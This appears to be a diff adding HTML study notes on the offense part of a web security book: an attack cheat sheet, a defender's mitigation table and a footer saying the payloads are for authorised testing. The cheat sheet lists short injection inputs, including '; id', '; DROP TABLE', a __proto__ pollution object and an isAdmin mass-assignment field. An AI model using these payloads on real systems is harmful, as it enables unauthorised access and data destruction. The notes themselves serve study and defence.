+<section id="cheatsheet">
+  <h2>Attack cheat sheet (Part II in one table)</h2>
+  <div class="tablewrap">
+    <table>
+      <thead><tr><th>Attack</th><th>The tell that it might work</th><th>Fastest test</th></tr></thead>
+      <tbody>
+        <tr><td>Stored XSS</td><td>User text is rendered as markup (a <code>&lt;strong&gt;</code> tag bolds)</td><td>Post <code>&lt;b&gt;x&lt;/b&gt;</code>, then view as another user</td></tr>
+        <tr><td>Reflected XSS</td><td>Search terms appear in the page heading/URL echo</td><td>Put a script tag in a query parameter</td></tr>
+        <tr><td>DOM XSS</td><td>Client router reads <code>location.hash</code>/<code>search</code></td><td>Source → sink check in the JS bundle</td></tr>
+        <tr><td>CSRF</td><td>State changes over GET, or POST without a per-request token</td><td>Build a link / form and fire it from another origin</td></tr>
+        <tr><td>XXE</td><td>Any endpoint touching XML — or converting JSON to XML internally</td><td>Send a DOCTYPE with an external entity</td></tr>
+        <tr><td>SQL injection</td><td>Queries built by string concatenation</td><td><code>1=1</code>, then <code>; DROP TABLE …</code> in a test DB</td></tr>
+        <tr><td>Code/command injection</td><td>User input reaches <code>exec</code>, a CLI, or a filename used in a shell</td><td>Append a harmless marker command (<code>; id</code>)</td></tr>
+        <tr><td>ReDoS</td><td>User-controlled length into a greedy regex</td><td>Long alternating string with a failing tail</td></tr>
+        <tr><td>Logical DoS</td><td>Expensive joins/backups triggered by ordinary features</td><td>Compare response times across account sizes</td></tr>
+        <tr><td>Mass assignment</td><td>Endpoints take a whole object and write it</td><td>Add <code>isAdmin: true</code></td></tr>
+        <tr><td>IDOR</td><td>Ids in paths/queries; no ownership check</td><td>Increment an id you do not own</td></tr>
+        <tr><td>Prototype pollution</td><td><code>merge</code>/<code>extend</code>-style helpers on user input</td><td><code>{"__proto__":{"isAdmin":true}}</code></td></tr>
+        <tr><td>Clickjacking</td><td>No <code>frame-ancestors</code>/<code>X-Frame-Options</code></td><td>Frame the page, overlay a button</td></tr>
+        <tr><td>Reverse tabnabbing</td><td><code>target="_blank"</code> without <code>rel="noopener"</code></td><td>Read <code>window.opener</code> from the opened page</td></tr>
+        <tr><td>Dependency attack</td><td>Old, known-vulnerable library versions (Part I fingerprints them)</td><td>Version → CVE → public exploit</td></tr>
+        <tr><td>Business logic</td><td>Money, discounts, refunds, credits, transfers</td><td>Model the flow; test negative amounts, repeats, self-payment</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<section id="defender">
+  <h2>Defender’s map (added here, not part of the book)</h2>
+  <p class="mini">Part III of the book covers these properly. This is only the index from attack → first fix, so you can see the shape of the response.</p>
+  <div class="tablewrap">
+    <table>
+      <thead><tr><th>Attack</th><th>First-line mitigation</th><th>Layer that catches the rest</th></tr></thead>
+      <tbody>
+        <tr><td>XSS</td><td>Contextual output encoding; <code>textContent</code> instead of <code>innerHTML</code></td><td>CSP with nonces, Trusted Types, a maintained sanitizer for allowed HTML</td></tr>
+        <tr><td>CSRF</td><td>Per-session CSRF tokens on every state-changing request; no state changes over GET</td><td>SameSite cookies, Origin/<code>Sec-Fetch-Site</code> checks</td></tr>
+        <tr><td>XXE</td><td>Disable DTDs and external entities in the parser</td><td>Prefer JSON; egress filtering; a hardened shared parser wrapper</td></tr>
+        <tr><td>Injection</td><td>Parameterized queries; argument arrays instead of shells; never <code>eval</code></td><td>Least-privilege DB/OS accounts, input allowlists</td></tr>
+        <tr><td>DoS</td><td>Rate limits, quotas, timeouts, payload caps</td><td>Safe regex (RE2), CDN absorption, autoscale cost alarms</td></tr>
+        <tr><td>Mass assignment</td><td>Explicit allowlist of writable fields (DTOs)</td><td>Separate “server-controlled” fields; audit logs on privilege fields</td></tr>
+        <tr><td>IDOR</td><td>Object-level authorisation on every access</td><td>Unguessable ids as a second layer; access logging</td></tr>
+        <tr><td>Prototype pollution</td><td>Reject <code>__proto__</code>/<code>constructor</code>/<code>prototype</code> keys; <code>Object.create(null)</code></td><td>Freeze prototypes; CSP; patched merge libraries</td></tr>
+        <tr><td>Clickjacking / tabnabbing</td><td><code>frame-ancestors 'none'</code>; <code>rel="noopener noreferrer"</code></td><td>COOP/COEP/CORP isolation; iframe <code>sandbox</code></td></tr>
+        <tr><td>Dependency attacks</td><td>Lockfiles, pinned versions, SCA on every build</td><td>Patch SLAs, vendor critical libs, SRI for CDN scripts</td></tr>
+        <tr><td>Business logic</td><td>Server-side pricing and balances, state machines, idempotency</td><td>Statistical anomaly detection, human review, misuse-case tests</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="callout good">
+    <span class="label">The through-line into Part III</span>
+    <p>Read the two tables as one idea: for every attack in Part II there is a <em>prevent</em> control and a <em>contain</em> control. The book’s own summary puts it best — defences are mitigations, so you stack them.</p>
+  </div>
+</section>
+
+</main>
+</div>
+
+<footer>
+  <div class="wrap">
+    <p>Notes on <strong>Part II (Offense)</strong> of <em>Web Application Security: Exploitation and Countermeasures</em>, 2nd edition — Andrew Hoffman, O’Reilly 2024. Figures are reproduced from the book for study purposes; captions were written for these notes. Code listings and payloads are the book’s examples, lightly reformatted for readability — they are included to illustrate attacks so they can be defended against, and should only be used against systems you are authorised to test. The “Defender’s map” section is an addition, not part of the book.</p>
+  </div>
+</footer>
+
+<button id="theme" title="Switch light / dark" aria-label="Switch light or dark theme">◐</button>
+<script>
+const bar = document.getElementById('progress');
+addEventListener('scroll', () => {
+  const h = document.documentElement;
+  bar.style.width = (h.scrollTop / (h.scrollHeight - h.clientHeight) * 100) + '%';
+}, {passive:true});
+
+const links = [...document.querySelectorAll('aside.toc a')];
+const secs = links.map(a => document.querySelector(a.getAttribute('href'))).filter(Boolean);
+const io = new IntersectionObserver(es => {
+  es.forEach(e => {
+    if (e.isIntersecting) {
+      links.forEach(l => l.classList.toggle('active', l.getAttribute('href') === '#' + e.target.id));
+    }
+  });
+}, {rootMargin: '-15% 0px -75% 0px'});
+secs.forEach(s => io.observe(s));
+
+const root = document.documentElement, btn = document.getElementById('theme');
+const saved = localStorage.getItem('notes-theme');
+if (saved) root.dataset.theme = saved;
+btn.addEventListener('click', () => {
+  const isDark = root.dataset.theme === 'dark' ||
+    (root.dataset.theme === 'auto' && matchMedia('(prefers-color-scheme: dark)').matches);
+  root.dataset.theme = isDark ? 'light' : 'dark';
+  localStorage.setItem('notes-theme', root.dataset.theme);
+});
+</script>
+</body>
+</html>
